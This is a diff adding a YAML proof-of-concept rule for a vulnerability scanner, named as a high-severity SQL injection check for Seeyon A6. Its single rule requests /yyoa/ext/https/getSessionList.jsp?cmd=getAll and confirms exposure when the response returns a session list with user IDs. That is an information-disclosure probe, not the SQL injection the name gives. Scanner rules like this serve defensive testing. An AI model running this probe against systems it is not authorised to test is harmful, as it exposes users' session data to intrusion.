@@ -1,0 +1,16 @@
+name: yaml-poc-seeyon-seeyon_a6-sql_injection-CT-158518
+binding: bf7b8e32-97f2-4f4b-8d09-709db37b3313
+detail:
+    author: system_user
+    vulnerability:
+        id: 660e5c53-977b-4b13-b598-f90b7082d701
+        level: high
+transport: http
+rules:
+    r0:
+        request:
+            cache: true
+            method: GET
+            path: /yyoa/ext/https/getSessionList.jsp?cmd=getAll
+        expression: response.status == 200 && response.body.bcontains(b"<SessionList>\r\n<Session>\r\n<usrID>")
+expression: r0()
